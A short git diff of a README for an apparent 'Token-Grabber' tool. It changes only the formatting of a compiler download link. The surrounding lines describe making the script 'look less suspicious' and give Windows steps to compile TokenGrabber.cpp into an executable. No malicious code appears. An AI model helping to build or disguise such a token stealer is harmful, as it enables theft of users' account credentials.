@@ -7,7 +7,7 @@
     + Found out how to make this script look less suspicious [Line 58 Of the code](https://github.com/xanthe1337/Token-Grabber/blob/master/TokenGraber/TokenGrabber.cpp#L58)
 
 # How to compile to .exe?
- - Download: [Download GCC!](https://jmeubank.github.io/tdm-gcc/download/)
+ - Download: [`Download GCC!`](https://jmeubank.github.io/tdm-gcc/download/)
  - Drag the `TokenGrabber.cpp` file to the desktop
  - Launch terminal with (windows + r, type "cmd" in the text box)
  - Now type `g++ TokenGrabber.cpp` in the terminal and wait for it to compile 
